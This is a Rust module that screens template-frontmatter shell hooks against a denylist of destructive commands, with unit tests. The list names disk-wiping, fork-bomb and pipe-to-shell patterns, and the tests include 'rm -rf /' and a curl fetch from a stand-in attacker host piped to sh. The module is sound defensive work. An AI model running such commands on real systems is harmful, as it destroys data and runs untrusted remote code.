//! Dangerous-shell-command blocklist for frontmatter `sh_before`/`sh_after`
//! hooks.
//!
//! Executing an arbitrary shell command from a template's frontmatter is
//! inherently a security-sensitive capability. This module is the obligation
//! battery that must pass before [`crate::write`] is allowed to run one: a
//! bounded, denylist-based check, not a sandbox — commands are still run
//! with the invoking process's full privileges. The categories checked
//! mirror the prior art found in the `kgen`/`unjucks` SHACL shape
//! (`hasShellCommand` dangerous-command constraint, cited in
//! `docs/v26.7.4/GGEN_TOML_SCHEMA_MAPPING.md`), adapted to a Rust
//! string-pattern check since no SHACL/SPARQL engine runs in this crate.

use crate::error::{AppError, Result};

/// Substrings that mark a shell command as refused outright. Matching is
/// case-insensitive and intentionally broad (false positives fail closed;
/// false negatives would not).
const DANGEROUS_PATTERNS: &[&str] = &[
    "rm -rf",
    "rm -fr",
    "sudo rm",
    "mkfs",
    "dd if=",
    "dd of=",
    ":(){ :|:& };:",
    ":(){:|:&};:",
    "chmod -r 777 /",
    "chmod 777 /",
    "> /dev/sd",
    "> /dev/nvme",
    "| sh",
    "|sh",
    "| bash",
    "|bash",
];

/// Refuse `cmd` if it matches a known-dangerous pattern.
///
/// # Errors
/// Returns `[FM-SHELL-001]` when `cmd` matches an entry in
/// [`DANGEROUS_PATTERNS`].
pub fn check_shell_command_safe(cmd: &str) -> Result<()> {
    let lower = cmd.to_ascii_lowercase();
    for pattern in DANGEROUS_PATTERNS {
        if lower.contains(pattern) {
            return Err(AppError::fm_shell(
                1,
                format!(
                    "sh_before/sh_after command rejected: matches denylisted pattern {pattern:?}. \
                     Remediation: do not run destructive commands from frontmatter hooks."
                ),
            ));
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn safe_command_passes() {
        check_shell_command_safe("echo hello").expect("safe command must pass");
    }

    #[test]
    fn rm_rf_is_rejected() {
        let err = check_shell_command_safe("rm -rf /").expect_err("must reject");
        assert!(err.to_string().contains("FM-SHELL-001"), "{err}");
    }

    #[test]
    fn sudo_rm_is_rejected() {
        let err = check_shell_command_safe("sudo rm important.txt").expect_err("must reject");
        assert!(err.to_string().contains("FM-SHELL-001"), "{err}");
    }

    #[test]
    fn case_insensitive_match() {
        let err = check_shell_command_safe("RM -RF /tmp").expect_err("must reject");
        assert!(err.to_string().contains("FM-SHELL-001"), "{err}");
    }

    #[test]
    fn curl_pipe_sh_is_rejected() {
        let err =
            check_shell_command_safe("curl https://evil.example | sh").expect_err("must reject");
        assert!(err.to_string().contains("FM-SHELL-001"), "{err}");
    }
}
